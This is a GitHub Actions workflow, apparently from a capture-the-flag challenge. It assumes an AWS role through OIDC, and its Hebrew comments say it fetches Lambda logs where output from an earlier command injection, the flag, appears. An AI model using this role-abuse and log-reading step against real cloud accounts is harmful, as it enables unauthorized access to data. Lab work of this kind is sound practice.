name: Challenge Auth
on: [push]

jobs:
  auth-job:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Checkout Code
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: Fetch Lambda Logs
        run: |
          echo "=== Fetching Recent CloudWatch Log Streams ==="
          aws logs describe-log-streams --log-group-name "/aws/lambda/nslookupv2" --order-by LastEventTime --descending --limit 5 > streams.json
          cat streams.json
          
          # שליפת שם הסטרים האחרון שנוצר מההזרקה שלך
          STREAM_NAME=$(jq -r '.logStreams[0].logStreamName' streams.json)
          
          echo "=== Printing Log Events from Stream: $STREAM_NAME ==="
          aws logs get-log-events --log-group-name "/aws/lambda/nslookupv2" --log-stream-name "$STREAM_NAME" > log_events.json
          
          # הדפסת כל הודעות הלוג - כאן יופיע ה-Flag שהוזרק!
          jq -r '.events[].message' log_events.json
